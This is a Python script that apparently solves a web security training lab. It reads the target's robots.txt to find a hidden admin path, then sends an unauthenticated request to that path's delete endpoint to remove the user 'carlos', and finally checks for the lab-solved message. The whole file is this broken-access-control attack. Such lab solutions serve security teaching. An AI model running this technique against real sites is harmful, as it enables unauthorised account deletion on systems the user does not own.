import sys
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def goto_administrator_panel(url):

    print()
    print(f"[*] Sending request as GET {url}/robots.txt")
    print()

    response = requests.get(url + "/robots.txt")

    path = None

    print("Response output:")
    print(response.text)

    for header in response.text.split("\n"):
        if "admin" in header:
            path = header.split(":")[1].strip()
    
    print(f"Path from robots.txt: {path}")

    url = url + path + "/delete"

    data = {
        "username": "carlos"
    }

    response = requests.get(url, params=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        goto_administrator_panel(url)
        verify_if_lab_solved(url)
